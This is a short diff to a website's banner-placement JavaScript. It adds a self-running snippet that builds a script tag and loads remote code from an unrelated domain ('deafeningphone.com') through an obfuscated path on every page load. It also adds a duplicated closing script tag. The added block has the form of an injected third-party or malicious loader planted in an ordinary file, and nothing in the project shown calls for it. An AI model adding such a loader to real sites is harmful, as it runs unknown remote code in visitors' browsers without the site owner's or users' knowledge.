@@ -28,4 +28,14 @@ if (window.matchMedia("(min-width: 1023px)").matches) {
 }
 $(html_left).insertAfter("#bannerLeft"); 
 }
+(function(pwtu){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = pwtu || {};
+s.src = "\/\/deafeningphone.com\/bRXqV.s\/dhG\/lF0HYjWNdsiXYyWq5cuFZXXKIX\/oesm\/9SuiZMUElEk\/POT\/UmyRN\/jigYy\/O-T\/QDtaNYTbIw2\/O\/DWIm5vNEQt";
+s.async = true;
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 </script>
